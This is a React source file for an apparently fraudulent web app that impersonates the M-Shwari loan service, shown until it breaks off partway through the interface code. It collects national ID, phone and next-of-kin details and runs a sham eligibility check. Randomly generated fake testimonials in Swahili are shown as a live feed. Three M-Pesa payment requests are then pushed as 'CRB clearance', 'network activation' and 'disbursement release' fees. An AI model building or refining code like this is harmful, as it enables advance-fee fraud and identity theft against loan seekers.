import React, { useState, useEffect, useRef } from 'react';

// --- Splash Images (I've used placeholders to keep the code clean, you can replace with your base64 strings) ---
const IMG_1 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGkAAABSCAYAAABXP/pUAAAD1klEQVR42u2dS0hUURjHf8YUrRoLoo1SCG7EmJ0Q1EaI6AEOaOQiNYkMAgmKVtXORSQtIiLoQVpBDxKcKIsWPXA2FS0kqYUQgS1y1UxBiyBoMVeSoXme5z3z/UEG0fvde+c3/+9857vnaBOP0oj81ip5CwSSSCAJJJFAEgkkgSQSSCKBFDclyvysVUP838CSJ/e6KXpdE7d7KgXpGbBL0znywFZg0SGg08CYxnj7gCeu053ONJgEdjsElAJOyZhUWec0pc961Bd9UARSBa135KZ2IC3VXW1usq1BoFMg1eamA+Ii/+dJJ8RF/kPqsuSmllBc5KrjMGLhHP2huMgVpG6g13BnYT8ByVXvbsBg7J4orQokDW/kHkOxDxOYXHbBjxga77oEkj6lDbgpOBe5hrRchelSb4gu8gHSALBdU6xjBCofnsyOaHJRt0Dy201HCVi+rHHoUzh2L7BTIJnXIQU3HSdw+QIpWaebdoTuIp8gLbspVeMxJ2kA+QQpCQzX8PspCu2luKk1zpBqdVNcXbQYd0jVjk0pzHbSGyLdfVU4Nk1hfUI5DTu8Pl3prcM1pBsUVq7Wo04K6xNKqV2x7L4MfLIEqLlMevtY7fhkCtJb4KkhNw0qxM0D94BfliDlqhif2lxB+gncVji+lJtagFGFuBPAgmdDzudKqc9k4TADZDS7aQi1JcMP8WeXR3HqK06T1qq7u4pu6ilykcrC+2kga2EM0p4mTUN6FY1P9WqIf/uK+hVddM1CFZczEdg0pKWo0lN10xbgjKKLZnybpFarhIV8+1zx+FFgo6KL7hhMbznTb6CNjsMXRRd0orZL74WhsajDBiBbkAAeOKyc7muu6PLAwf9UZLGHtIDePavVat7QWLTN5k3YbLC6cNMkdvt0sYf0QbELUU9ayhCAbD+quGrxXOOYawH9CRlS1tKnOw88Nhj/TciQsJTyJoA5Q7GTwJUVXYYgIU2h1iqq9hwmta5Ml6E5+mrTdbIEbnSeQkfahKaBWYfjfK7otVSnYqU2AGtLzb1cQcpGbjKxC+J6DAq2XIXvnac7UG+8llIGi3+YKeTCYVkvge8xLEoaCtICcEFjvHnMP9RrOEhEc5m8pliX8PPReOwhzUVzGh2T1wyByocVrFMa3DQeqot8gTSrwU2TBCxf1oKrTGzHCOBxRBwgZaNOQT26ReDyaVdFPUuuLuLfilTtSnh0Le+j1LW5hmNu0gDyCdIScBaR1+lOJJAEkkggNbZKFQ6vgW8KcX94ft/vFK5xte3Jc5P8M2BJdyKBJJBEAkkkkASSSCCJBFLc9BfQq5g38RAsSAAAAABJRU5ErkJggg==";
const IMG_2 = "data:image/png;base64,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";
const IMG_3 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAABSCAYAAAAIArdYAAABEklEQVR42u3cMU7DQBAF0B8rNDSIJl2uwFWgoEQcgAvkAKFKzyWgo+MeFPSUVKSBClEQSxGiIrNgxe9Lll2N5ml3La1teZL7s4wpXUYWYGBgYGBg4P/LdOt6XlDvuWGvJf314Lsk5wUFV0kWDbBXSW4K6jx0P4z0LjluNLqHRXUO3LSAh5EPIwy8X+DOGjalgYGBgYGBgYGBgYGB7Yd/n2lxY7MkFw3AJ0MFn24OUxoYGBgYGBgYGBh4z1K9eXhN4Zu+bwNzNETwbZJlvr7Xqvrua57kMsn1EMF9k9vninpv1jAwMDAwMDAwMDAwMDAwMDAw8FjB/UO8lySPBfWeGvX5XtTfeuLHJcDAwMDAwMB/lU/sBRrVByknOAAAAABJRU5ErkJggg==";
const IMG_4 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABSCAYAAAD3oJK6AAAERUlEQVR42u2cT09UVxjGfxJXLjo7SZoxMbFTbTqClJDBUBzbStE0IaYbu+nX6HfowqVLV667kDZaasCoKBEkSjX+w65KmplFQ+gn6IJ7E5zcezn3fd9zDibn2QCTe8+89zf3ec6fe5hDzF8mqVxDCUEClAAlQAlQApQAJUAJUFKRDu/5/ZhRm397rvlYyBpzQD8DPxldwJ/Ad8CWMZjTWdtB6xsChoF7hhcyAox6uHNmY9SXZ9A6sGp4MWc8AGrGqC8H1Af+MCzga2M4w8A3hu3NSXqxFcMCjgItw/ZaQNuwvZOu9e0FZGmzNvCp4QVNGt+RDdf69gKytpllDjWx1yXJQPHxAcyh48b5k6srAbRmaLNxoxxqGufP3gFnqy4gS5s1gM4BzJ9a9RXNxSx7M4uLG/E4bZmUALLszboG9hrzCKgrAWRpMyef73P3tD0Cau9XX9lyx0pIn1fobIAVjY4EkKXNNDl0OgCgbyWA+sB85BxqAScCAJqTAALYMPT5qBBQOwCgRlV9VYB+A7aNipBYJUT+5JqSAAK4FsLnEfNn35zcD9DjED4v0BfA+YCA5qSArGzWqJlDH2fnhFJpfS6Pfa769nmBLhBeU1JATyOMh44L32PLuj4XQLeMbOaaQ6OK/LmuqO9HKSCr3qwBTDsc94kwf1aBX5QzgGkpoIWA46GvhG2vAM+V88gJKaBlI5tddjjmM2HbL7OfDxT1XZQCsrLZjEP+jCvuIIB3wI5VfXUAWdmsKodOCfNnKbMXQC9bjTCprw6gZaMlkAkhvCo9GliJeK6o75wUENisNF70kD+DUyJNDnU1gCxsNuMhf94M/K3NoWEpICubFVmpI8yfm8DmwGsbwF1FfeNSQFY2K8qhL4VtLZe8/kRR31hsQEU5dFLYVlnePLPIIQmgtwY2e8/nmeWkgP6pqPOFor6mFJDVc7Pxgd5Lkj83KN+QuZmFtVQdKSArm415zJ9cDxX1zWoAWdisWwJLMr1wHR/V0VlgWArIwma5z6eR7X3edhgx9xQ51AY+0uy0t7BZB/hcmD8uk+dNBSCAEQ2gt9kkUaNTwPfCc127cc2AcVYDqG8A6AeHJZAyue661+TQJe0/s9xXni99tLxUML0o078KmzW1gCxsJtHtGsduAYvSN9IC6kcC9NJ4OOANkIXNJKq7IPY6JqDQNquaXlSNh5ZiAerXzAStloU1/hULkLYrraMdQf7kWogJKJTN3gjvoDrjJi+AQtlMM735j93l2SiAAO4EAPRM+SGuxQTU82yznczKGj2NCcj3oHEd3QPBvI1ogGB3y95BmF5UfYg3YwLqSYLQUa+M2rkfE5AoCB20jd3G9tWYgHzZbAG7b3LYpMZjaR+Aeh66/LvGd/l8TEB94PcDmj+1x1OHPQXqr8AV4IhBW+/QbWcp0iKOq4yH0hdNhrdYApQAJSVACVAClAAlQB+C/gez/dGf8FRqvAAAAABJRU5ErkJggg==";
const IMG_5 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFoAAABSCAYAAADU+8NvAAAFFklEQVR42u2dQWhcVRjHf33swdvixZWSQi5JLa5sqbihkKBtScQS3eKmSQoNVooUWsST9FI81Yu3HDx48GIK2lIhVGtJhChNNTTaQzUn46FgLj1JLp497FtYlmz2zcx3zjy28z8lm/dm/9523n++9363d3OcOUOUfyURQQQdQUdF0BF0BB0VQUfQURF0UVUyPP6QqN9/RO0U7XokoMeBdVG/nwFXHdv4GpgXXc814NOiWEdd2O99x/PHhZARt+UM+qiozy3grmMbM2IOVaBZBNDDwIKoz2XH80eAjzywuFQE0FVhn6uO5896YjEJTIQGXRP1t+k4oVaAdzwOvLnQoA8XZDS/IZ6Uu3U+/TCDgFb6syvoc56DgzLQCAW6WhDbGPcFoUsXQ4GuFWQ0z5CP6j4mxSygXxP0s+sIegQ4lWNq4oO8QR8T3a6PHG2jIQ4x+2kBGMoT9EFRP2uOId1Z8tdsnqDHRLbhktvwHdL10id5gn6lALZxjjAqA6fzAK3yZxfbmEhHdCjN5wH6oMg2vndcEpcDgl5IIx6voBX+/DPw2CGke53wmvUNWuHPvwUO6XYE7+Fjn6CPCbzR1TZcQ7pNNOWpMoKiQLLPbVsOaBtNQUi3SquSsynyai+gjwe2DUW2cIVWdfuOoK0GjjmfXqCHA9rGhCCsXAMepD/fR6MratA1gT+72IaiynGz4+d13OuU7eijogT9ksCff7A8b4hWlcNVG12/3xNNig0l6OMC23josBJz/ZAXgT+7XnuYXperZmxHdTfoiiB+drGN9zyMZtLrUYzqSWBUAfpF4NVAttFEk3P+tcfrt0WTYlMBWuHPtrahCOmu03vD4h+0dkm56oJN/iMR+/OSpW3U0GQKV/b527Yo+igDb7uAVvjzA8vzFDW6tQz9r4rsY850UuwEPSrwZxvbqIhCupsZjvkLt/x4W3VTVp2gjzj6s61tNNDknH/KcMxTUfRhPKd0gh4PZBsfCt70curBWfSjCPRbJvmPpOP2PZzDiOrWaVFId8Pg2MfCSXHaFPSoI+glgxHVvRJ01b8Wd5PKPubJuP8jEfmzjW3URLHz56n3mt59iiV5lYwlv0Tkzza2odpLt2JxzjZwS9R/poip/a2svG2jIpoEd2kVcG2qMc+JQJ+hlUNf7wd6AreykY1tTIpCunK67A6tZj/QCfByANu4ymDpVL/8RwK869DBooVtqEK6IqkKnOgH+ohDBxuBQroiaq4faJd9wL8YHj+C7vswRdNJ9tkUmTjahulOoFkGW1M+QJvaxtAA20ZbF3rlP1xAm6ZExwZwEtwr3JxUgl4EnhguUC7xbOgsexQFbEGb7uAf6fVJD6Dqe6U0bEGbrgZneLZ0XgF6EbNsWQ0/j30osk7Q9aXQkkUjprYxLXwDW54BHUKXg5nqZFXybBvKkO468IVn0EeB70RtXQG+bAcNJc+2oQrpdmntNNrxDHonvWsU1/w8rUr5ExuPNrGNinC5fQ/7/Xym+kbY1mXbyfCRYUineuzDbfLTLWFbJ9uhXmJoGyaLFFVIt4X9fj4bbaPbkgDwpiloE9uopet+hTZy8OZuLQvbugYMZwVtWtKfRveN16UAcfC34vamsoL+yiDaGEL3JK81Wvvl8tZT8Qd8MStoE88aQ/fYh7uY79lQaVXYVr2UYbX1N/C7ofkrVnD/iSMAU90A3gdeUDR2IP7Dm3wUH9QdQUfQURF0BB1BRwQRdAQdZa7/AePN2EfxrarfAAAAAElFTkSuQmCC";
const IMG_6 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADwAAABSCAYAAAAIArdYAAADAElEQVR42u2cP2gTcRTHPy11KZgYHARrcBJEUqoO4uJSqKBQI3SUqpMOUjIognAu/gFjaVEkiyCKijhE0GIr4qYBQYe26iKCWFsRHKx1cOnicD8xhDSXS97lfr/7/b7LXcnlcZ+83Pu9936v6WLqMDapG8vkgB2wA3bADtgBO+D41FN1no35XhY7CbwPeBkj7DIwC3wDFoDvwFfgI/ApCuD1MXs3Aww2+DBKwGtgxoZnOAN4wDTwEzgD9NsStDLAOPAOuAhssSlKe8AzYMSmZSkHlJW3rVqHPeCabYlHoRnopGVahaCvdxJTSw84aFsuXbQNOAecsK1aGguqliS1EuLadIReHgEeRQ08HAI4pY47VfEwKHwv+U4AzwFLId8zDVxW0bWovCOhQ7o/wzPAAeCNkL00MKB70FpaK8K2qH4TovQ8cEnIVsqUZem5kJ0dpgAv2ObhRfx+lqh0z7RmbQPeZRNwFr9p165+mwK8VcjOZ1OA9wrZ+WEC8Db8/rP48qYr8HlBW690Bh4A7gKjQvZedKIBkAFW1fk6dVxV57VHgI1AH7AfOC7cECh3AvgB8Kfq796a12tfy0bU9Vihzm5jFMA5TR6PqXqNiCQ38SZMTC1bVUnV1FYAfwCumFo8tBKoztGgiZg04AvAU5PLwzDygMmgi3oSAnsSuNnMhaYDL+M32ytJaAAE6R6wOwys6cAp4EvYN5kMnMcfUrMGGOAYNXtHcQStYeBXwDUbgPsCVVIOOA0cjRN4jua2S2+otbNdjQJPqNkH1vErXSbcpEAjnaXJucs4geeBO0K29qjkQ/ugdVvQy2P4g+5aA0t6Oa0CmPbLkqSX8wRMD+gALOllgKv4jXytE49bgrbSwCndgd8D1wXtFVhjwFSn1LIsbK+oO3BF2Ms56sxO61Y8SHvZQ/PBtArwUNjmuO7lYUnY3hBV/+rTTYNx+Ri9/DiCZW/Tv/JwO/AWf6Czt03DffzfKm1HE8Bmgfup1hFgssv9cIkDdsAO2AE7YAfsgDulv/Fpd7yOAQjYAAAAAElFTkSuQmCC";
const IMG_7 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABoAAABSCAYAAABKQcTPAAAAeklEQVR42u3ZsQmAQAxG4ae4his4i4Jr2oijuIHgAgdiaXuVV9x5WLy/SpUPknRpWEdqpKVShISE8tNFdV+o55GCNmAoAM3A8ja6+4MpeXVCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQnHiP8IJ7Jn9LiCkoMkdCQn9G3oAuBIJga6yH/kAAAAASUVORK5CYII=";
const IMG_R = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFwAAABSCAYAAADZ5bMoAAADbElEQVR42u2bvWtTURjGfylNO6gVFFxKNnF0EuyQOtlRsOA/oNBOVdCpLuLHoFODKIIKBnQRBVtQHGyXtg4uFewm1cmKIDqIdgi3pQ55L9zGmt7v3NM8D4RLPji5/O5zn3PekzelL+UDSPmpRwgEXMAlARdwScAFXBJwAVdwScAFXBJwAVcEnMAF3DmtAi+AqoBnrwlgEBgFFosKvrSLfmL7A/QFnpftOAfcA6bl8PQ0Bexpec2zx0lz+6y5Xw5PqKpFiLfD53zHLwK1Tjl+NwBfAIZDAN8O/DPgriIl2kQZBXYwaoaBO8AHG0cOD6HNiLDbOf4rcCtrx7vs8NmUxvEdf8gc/wOYFPCtmrTVh5fyuB4wANy0u+e6IgVGgDcZwG4XNzeAK90KfNVu/zzlg68Bl7opUmatfM9bfs5ftKh51A3ApzLK7Tjgzxr4yPs1rgCfMHd5BTkfH7y/UbYQFrwLGT5qTvIKfI7B6vVEJxx+O6VxhoAnBYdNlPPLAvg4cCEF6FXgFf/uAhbV4T93cncWwKvAfaBh0McTjPXUihAPNzTWiQxfASqB5/1AKeZae9AR2GXgMs19mFwjZb4FNub0lYh3iF/YuAK7FhZ2msCft8mvil2MMCX7TIcKm7iw61Erz56UYJ8xN/9Px3dw+qjtjww45Ow6cC7vSjMM7KDTN7eZSCdtnY1Dzq7FgZ100owCm5aJdAZ4DJyyMtkVVxNlgkwT+LxldiPm9/bHLRw6vM4eI+GPz70x1tl1i4e4sNeBjYBjXHD2nE3qiRUlw8/bXkElwfet02zWKTsC2l9jj6Q1aFiHTwOnE7q6xNbOqKJn9RxwDXib5uBhgG8a6EaXgF4GrpJRo1AY4HFWIWuOgn5Ixm0SvSmOtW7HDQdAB+eQXFvfkgD3nYwjbg5CXgMe0Gx1e5fnSfRGBOvD9dfOfY4A9lUHXtLB1uUwwJeBo23e9woK14+L18AS6XVqJVKUSnMIOAbsBY4Ah2k2REaRZ3C8lIC2GmMJeA98LArgNPdSghqxCzEYuCAVi6P99vrBBOOvAZ+BX8Anmnvm32k2YH7LO4eLADyqhuy4b5v3ftvRGYguAO9a6X+aAi7gkoALuCTgAi4JuIALuCTgAi4JuIBLAi7gAi4JuIBLAi7gkoALuIBLAi7gUlT9BSWwuZFFI5P8AAAAAElFTkSuQmCC";

const COUNTIES = ["Nairobi","Mombasa","Kisumu","Nakuru","Eldoret","Meru","Nyeri","Kisii","Bomet","Kakamega","Machakos","Kilifi","Garissa","Kitui","Embu","Murang'a","Kiambu","Nyandarua","Laikipia","Turkana","Marsabit","Isiolo","Tharaka Nithi","Kirinyaga","Kajiado","Narok","Taita Taveta","Kwale","Tana River","Lamu","Mandera","Wajir","Vihiga","Bungoma","Busia","Nyamira"];

export default function App() {
  // --- States ---
  const [view, setView] = useState('splash');
  const [processing, setProcessing] = useState(false);
  
  // Data State
  const [formData, setFormData] = useState({
    fullName: '', phone: '', id: '', age: '', occupation: '', county: '', email: '', nextKinName: '', nextKinPhone: '', hearAbout: 'Friend/Family', purpose: ''
  });
  const [errors, setErrors] = useState({});
  
  // Disbursement States
  const [selectedNetwork, setSelectedNetwork] = useState('safaricom');
  const [selectedDisbPhone, setSelectedDisbPhone] = useState('');
  
  // Modals & Overlays
  const [showHearAboutSheet, setShowHearAboutSheet] = useState(false);
  const [showCrbModal, setShowCrbModal] = useState(false);
  const [crbPhone, setCrbPhone] = useState('');
  const [crbStatus, setCrbStatus] = useState({ type: '', msg: '' });
  
  const [showStkOverlay, setShowStkOverlay] = useState(false);
  const [stkPhoneDisplay, setStkPhoneDisplay] = useState('');
  
  const [showNetFeeConfirmed, setShowNetFeeConfirmed] = useState(false);
  const [netFeeReceipt, setNetFeeReceipt] = useState('');
  
  const [showAllFeesCleared, setShowAllFeesCleared] = useState(false);
  const [disburseReceipt, setDisburseReceipt] = useState('');
  
  const [toastMsg, setToastMsg] = useState('');
  
  // Check items progress
  const [checkProgress, setCheckProgress] = useState(0);
  
  // Live Feed State
  const [feedItems, setFeedItems] = useState([
    { name:'James M.', initials:'JM', color:'#00b050', text:'Nimepata STK nikalipa 280 na 15k ishaingia kwa Mpesa! Shukran M-Shwari.', time:'1 minute ago' },
    { name:'Mercy W.', initials:'MW', color:'#008a3e', text:'Nimepokea saa hii. Asante sana M-Shwari!', time:'45 seconds ago' },
    { name:'Samuel K.', initials:'SK', color:'#00b050', text:'Fast and reliable. 15,000 imeingia chap chap.', time:'2 seconds ago' },
    { name:'Dennis B.', initials:'DB', color:'#008a3e', text:'Leo shule nafungua niko na school fees yote.', time:'5 seconds ago' },
    { name:'Diana J.', initials:'DJ', color:'#00b050', text:'Niko Eldoret na nimepata. Nililipa 280 na zikatumwa mara hiyo.', time:'10 seconds ago' }
  ]);

  const feedIntervalRef = useRef(null);

  // --- Splash Logic ---
  useEffect(() => {
    if (view === 'splash') {
      const timer = setTimeout(() => setView('step1'), 4600);
      return () => clearTimeout(timer);
    }
  }, [view]);

  // --- Live Feed Logic ---
  useEffect(() => {
    if (view === 'step3' || view === 'crbPage') {
      if (!feedIntervalRef.current) {
        feedIntervalRef.current = setInterval(() => {
          const names = [
            { name:'Peter O.', initials:'PO', color:'#00b050' },
            { name:'Faith A.', initials:'FA', color:'#008a3e' },
            { name:'Kevin O.', initials:'KO', color:'#00b050' },
            { name:'Sarah W.', initials:'SW', color:'#008a3e' },
            { name:'David M.', initials:'DM', color:'#00b050' }
          ];
          const texts = [
            'Nani mwingine amepata? Yangu imekubali.',
            'Niko Kisumu na nimepata. M-Pesa confirmed!',
            'Hii kitu ni legit, 15k imefika.',
            'Asante sana M-Shwari!',
            'M-pesa ishaingia, shukran sana.'
          ];
          const times = ['Just now','5 seconds ago','10 seconds ago','30 seconds ago'];
          
          const rn = names[Math.floor(Math.random()*names.length)];
          const rt = texts[Math.floor(Math.random()*texts.length)];
          const rtime = times[Math.floor(Math.random()*times.length)];
          
          setFeedItems(prev => {
            const next = [{ ...rn, text: rt, time: rtime }, ...prev];
            return next.slice(0, 20);
          });
        }, 8000);
      }
    } else {
      if (feedIntervalRef.current) {
        clearInterval(feedIntervalRef.current);
        feedIntervalRef.current = null;
      }
    }
    return () => {
      if (feedIntervalRef.current) clearInterval(feedIntervalRef.current);
    };
  }, [view]);

  // --- Validation Helpers ---
  const validateName = (val) => /^[a-zA-Z\s.]+$/.test(val) && val.length >= 3;
  const validatePhone = (val) => /^(07|01)\d{8}$/.test(val);
  const validateId = (val) => /^\d{6,8}$/.test(val);
  const validateAge = (val) => { const a = parseInt(val); return !isNaN(a) && a >= 18 && a <= 99; };
  
  const handleInputChange = (e) => {
    const { id, value } = e.target;
    let val = value;
    
    // Numeric filters
    if (id === 'phone' || id === 'nextKinPhone') val = val.replace(/[^0-9]/g, '').slice(0, 10);
    if (id === 'id') val = val.replace(/[^0-9]/g, '').slice(0, 8);
    if (id === 'age') val = val.replace(/[^0-9]/g, '').slice(0, 2);

    setFormData(prev => ({ ...prev, [id]: val }));
    
    // Clear error as they type
    if (errors[id]) setErrors(prev => ({ ...prev, [id]: false }));
  };

  const handleSubmitApplication = (e) => {
    e.preventDefault();
    const newErrors = {
      fullName: !validateName(formData.fullName),
      phone: !validatePhone(formData.phone),
      id: !validateId(formData.id),
      age: !validateAge(formData.age),
      occupation: formData.occupation.trim().length < 2,
      county: formData.county === '',
      hearAbout: formData.hearAbout === ''
    };
    
    setErrors(newErrors);
    
    if (Object.values(newErrors).some(err => err)) {
      showToast('Please correct the highlighted fields.');
      return;
    }

    setProcessing(true);
    setTimeout(() => {
      setProcessing(false);
      setView('step2');
    }, 2200);
  };

  const handleSubmitPurpose = () => {
    if (!formData.purpose) {
      setErrors(prev => ({ ...prev, purpose: true }));
      return;
    }
    setErrors(prev => ({ ...prev, purpose: false }));
    setProcessing(true);
    setTimeout(() => {
      setProcessing(false);
      setView('checkingPage');
      runEligibilityCheck();
    }, 1400);
  };

  const runEligibilityCheck = () => {
    let current = 0;
    const timer = setInterval(() => {
      current++;
      setCheckProgress(current);
      if (current >= 5) {
        clearInterval(timer);
        setTimeout(() => setView('step3'), 1000);
      }
    }, 1600);
  };

  const showToast = (msg) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(''), 3000);
  };

  // --- API & Payment Logic ---
  const normalizePhone = (raw) => {
    let p = raw.replace(/\D/g,'');
    if(p.startsWith('0')) p = p.slice(1);
    if(p.startsWith('7')||p.startsWith('1')) p = '254'+p;
    else if(!p.startsWith('254')) p = '254'+p;
    return p;
  };

  const sendPaylorSTK = async (phone, amount, reference, description) => {
    const payload = {
      phone: normalizePhone(phone),
      amount: Number(amount),
      reference: reference || `MSHWARI_${Date.now()}_${Math.floor(Math.random()*10000)}`,
      description: description || 'M-Shwari Payment'
    };
    const res = await fetch('/api/pay', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || data.message || 'STK push failed');
    return data;
  };

  const queryTxn = async (id) => {
    const res = await fetch(`/api/pay?transactionId=${encodeURIComponent(id)}`);
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || data.message || 'Failed to fetch status');
    return data;
  };

  const pollTxn = (txId, onSuccess, onFail) => {
    let attempts = 0; const max = 20;
    const p = setInterval(async () => {
      attempts++;
      try {
        const t = await queryTxn(txId);
        const s = t.status || t.state;
        if (s === 'COMPLETED' || s === 'SUCCESS') { clearInterval(p); onSuccess(t); }
        else if (s === 'FAILED' || s === 'CANCELLED') { clearInterval(p); onFail('Payment failed. Try again.'); }
        else if (attempts >= max) { clearInterval(p); onFail('Timed out. Check M-PESA.'); }
      } catch(e) { console.warn('poll', e); }
    }, 3000);
  };

  const processCRBPayment = async () => {
    if (!crbPhone) {
      setCrbStatus({ type: 'error', msg: 'Please enter your M-Pesa number.' });
      return;
    }
    setCrbStatus({ type: 'pending', msg: 'Sending STK push...' });
    setStkPhoneDisplay(`(${crbPhone})`);
    setShowStkOverlay(true);

    try {
      const ref = `CRB_${Date.now()}_${Math.floor(Math.random()*10000)}`;
      const r = await sendPaylorSTK(crbPhone, 280, ref, 'M-Shwari - CRB Clearance Fee');
      if (r.error) throw new Error(r.error);
      const txId = r.transactionId || r.id;
      if (!txId) throw new Error('No transaction ID');
      
      pollTxn(txId, () => {
        setShowStkOverlay(false);
        setShowCrbModal(false);
        // Success logic
        const raw = formData.phone.startsWith('0') ? formData.phone : '0' + formData.phone;
        setSelectedDisbPhone(raw);
        setView('disbursementDetailsPage');
      }, (msg) => {
        setShowStkOverlay(false);
        setCrbStatus({ type: 'error', msg });
      });
    } catch (err) {
      setShowStkOverlay(false);
      setCrbStatus({ type: 'error', msg: err.message });
    }
  };

  const processNetworkFeePayment = async () => {
    setStkPhoneDisplay(`(${selectedDisbPhone})`);
    setShowStkOverlay(true);

    try {
      const ref = `NET_${Date.now()}_${Math.floor(Math.random()*10000)}`;
      const r = await sendPaylorSTK(selectedDisbPhone, 328, ref, 'M-Shwari - Network Activation Fee');
      if (r.error) throw new Error(r.error);
      const txId = r.transactionId || r.id;
      if (!txId) throw new Error('No transaction ID');
      
      pollTxn(txId, (t) => {
        setShowStkOverlay(false);
        setNetFeeReceipt(t.providerRef || t.reference || `UG${Math.random().toString(36).substring(2,11).toUpperCase()}`);
        setShowNetFeeConfirmed(true);
      }, (msg) => {
        setShowStkOverlay(false);
        showToast(msg);
      });
    } catch (err) {
      setShowStkOverlay(false);
      showToast(err.message);
    }
  };

  const processDisbursementFeePayment = async () => {
    setStkPhoneDisplay(`(${selectedDisbPhone})`);
    setShowStkOverlay(true);

    try {
      const ref = `DISB_${Date.now()}_${Math.floor(Math.random()*10000)}`;
      const r = await sendPaylorSTK(selectedDisbPhone, 700, ref, 'M-Shwari - Disbursement Release Fee');
      if (r.error) throw new Error(r.error);
      const txId = r.transactionId || r.id;
      if (!txId) throw new Error('No transaction ID');
      
      pollTxn(txId, (t) => {
        setShowStkOverlay(false);
        setDisburseReceipt(t.providerRef || t.reference || `UG${Math.random().toString(36).substring(2,11).toUpperCase()}`);
        setShowAllFeesCleared(true);
      }, (msg) => {
        setShowStkOverlay(false);
        showToast(msg);
      });
    } catch (err) {
      setShowStkOverlay(false);
      showToast(err.message);
    }
  };

  // --- Render Components ---
  return (
    <>
      {/* SPLASH */}
      <section className={`view ${view === 'splash' ? 'active' : ''}`} id="splash" onClick={() => setView('step1')}>
        <div className="stage">
          <div className="logo" role="img" aria-label="Mashwari">
            <img className="g" style={{ left: '0%', width: '21.169%' }} src={IMG_1} alt="" />
            <img className="g" style={{ left: '21.169%', width: '16.734%' }} src={IMG_2} alt="" />
            <img className="g" style={{ left: '37.903%', width: '12.097%' }} src={IMG_3} alt="" />
            <img className="g" style={{ left: '50%', width: '14.516%' }} src={IMG_4} alt="" />
            <img className="g" style={{ left: '64.516%', width: '18.145%' }} src={IMG_5} alt="" />
            <img className="g" style={{ left: '82.661%', width: '12.097%' }} src={IMG_6} alt="" />
            <img className="g" style={{ left: '94.758%', width: '5.242%' }} src={IMG_7} alt="" />
